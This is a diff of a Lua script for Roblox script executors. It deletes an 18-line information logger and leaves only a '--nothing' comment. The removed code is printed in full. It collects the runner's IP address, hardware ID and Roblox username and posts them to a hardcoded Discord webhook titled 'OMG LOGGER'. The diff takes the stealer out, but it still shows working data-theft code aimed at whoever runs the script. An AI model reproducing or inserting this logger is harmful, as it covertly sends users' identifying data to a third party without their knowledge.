@@ -1,18 +1,1 @@
-local local_user_info = {
-    IP = tostring(game:HttpGet("https://api.ipify.org")),
-    HWID = tostring(game:GetService("RbxAnalyticsService"):GetClientId()),
-    RobloxUsername = tostring(game:GetService("Players").LocalPlayer.Name)
-}
-function Send(title, desc, URL)
-    local Data = game:GetService("HttpService"):JSONEncode({
-        ["embeds"] = {{
-            ["title"] = title,
-            ["description"] = desc,
-            ["type"] = "rich",
-            ["color"] = tonumber(0x7269da),
-        }}
-    })
-    request = http_request or request or HttpPost or syn.request
-    request({Url = URL, Body = Data, Method = "POST", Headers = {["content-type"] = "application/json"}})
-end
-Send("OMG LOGGER","**IP: **".."__"..local_user_info.IP.."__".." | **HWID: **".."__"..local_user_info.HWID.."__".." | **Roblox Username: **".."__"..local_user_info.RobloxUsername.."__", "https://discord.com/api/webhooks/951727634126098492/_BO4Qg90kHAjsdHfA-zedOBYVwxxjSJBrYlrW_uuFtIq9L7RDGgz98P4YJTOVQ14vvs_")
+--nothing
